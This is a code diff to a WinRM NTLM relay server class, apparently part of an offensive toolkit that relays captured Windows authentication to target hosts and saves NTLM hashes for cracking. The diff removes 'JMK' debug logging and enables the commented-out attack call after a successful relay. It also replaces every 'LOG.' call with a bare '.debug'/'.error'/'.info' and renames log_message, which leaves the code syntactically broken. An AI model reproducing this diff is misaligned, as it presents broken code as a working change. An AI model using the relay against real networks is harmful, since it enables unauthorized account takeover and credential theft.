@@ -69,8 +69,8 @@ class WinRMRelayServer(Thread):
             try:
                 http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
             except Exception as e:
-                LOG.debug("Exception:", exc_info=True)
-                LOG.error(str(e))
+                .debug("Exception:", exc_info=True)
+                .error(str(e))
 
         def handle_one_request(self):
             try:
@@ -78,15 +78,15 @@ class WinRMRelayServer(Thread):
             except KeyboardInterrupt:
                 raise
             except Exception as e:
-                LOG.debug("WinRM(%s): Exception:" % self.server.server_address[1], exc_info=True)
-                LOG.error('WinRM(%s): Exception in HTTP request handler: %s' % (self.server.server_address[1], e))
+                .debug("WinRM(%s): Exception:" % self.server.server_address[1], exc_info=True)
+                .error('WinRM(%s): Exception in HTTP request handler: %s' % (self.server.server_address[1], e))
 
-        def log_message(self, format, *args):
+        def _message(self, format, *args):
             return
 
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
-                LOG.info('WinRM(%s): send_error path: %s' % (self.server.server_address[1], self.path.lower()))
+                .info('WinRM(%s): send_error path: %s' % (self.server.server_address[1], self.path.lower()))
                 return self.do_GET()
 
             return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)
@@ -165,7 +165,7 @@ class WinRMRelayServer(Thread):
                     #_, blob = typeX.split('NTLM')
                     token = base64.b64decode(blob.strip())
                 except Exception:
-                    LOG.debug("Exception:", exc_info=True)
+                    .debug("Exception:", exc_info=True)
                     self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
@@ -195,7 +195,7 @@ class WinRMRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
+            # Should we relay or -in locally?
             if self.relayToHost is False and not self.server.config.disableMulti:
                 self.do_local_auth(messageType, token, proxy)
                 return
@@ -204,7 +204,6 @@ class WinRMRelayServer(Thread):
                 self.do_relay(messageType, token, proxy, content)
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
-            LOG.info('JMK: do_AUTHHEAD')
             if proxy:
                 self.send_response(407)
                 self.send_header('Proxy-Authenticate', message.decode('utf-8'))
@@ -275,12 +274,10 @@ class WinRMRelayServer(Thread):
 
             # Should we relay or log-in locally?
             if self.relayToHost is False and not self.server.config.disableMulti:
-                LOG.info('JMK: do_GET - do_local_auth')
                 self.do_local_auth(messageType, token, proxy)
                 return
             else:
                 # We can start the relay process
-                LOG.info('JMK: do_GET - do_relay')
                 self.do_relay(messageType, token, proxy)
 
             return
@@ -293,10 +290,8 @@ class WinRMRelayServer(Thread):
                     return False
 
                 if self.negotiation_count > 1:
-                  LOG.info('JMK: skipping do_ntlm_negotiate')
                   return False 
 
-                LOG.info('JMK: first do_ntlm_negotiate')
                 self.negotiation_count += 1
 
                 self.challengeMessage = self.client.sendNegotiate(token)
@@ -336,7 +331,6 @@ class WinRMRelayServer(Thread):
 
         def do_local_auth(self, messageType, token, proxy):
             if messageType == 1:
-                LOG.info('JMK: do_local_auth - type 1')
                 negotiateMessage = ntlm.NTLMAuthNegotiate()
                 negotiateMessage.fromString(token)
                 ansFlags = 0
@@ -398,7 +392,6 @@ class WinRMRelayServer(Thread):
 
         def do_relay(self, messageType, token, proxy, content = None):
             if messageType == 1:
-                LOG.info("JMK messageType: 1")
                 if self.server.config.disableMulti:
                     self.target = self.server.config.target.getTarget(multiRelay=False)
                     if self.target is None:
@@ -437,7 +430,6 @@ class WinRMRelayServer(Thread):
                         self.do_REDIRECT()
 
             elif messageType == 3:
-                LOG.info("JMK messageType: 3")
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
 
@@ -491,13 +483,8 @@ class WinRMRelayServer(Thread):
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.config.outputFile)
 
-                    # todo: DO ATTACK
-
-                    self.server.config.target.logTarget(self.target, True, self.authUser)
-
-                    LOG.info("DO ATTACK")
-                   
-                    # self.do_attack()
+                    self.server.config.target.logTarget(self.target, True, self.authUser)                   
+                    self.do_attack()
                     
                     if self.server.config.disableMulti:
                         # We won't use the redirect trick, closing connection...
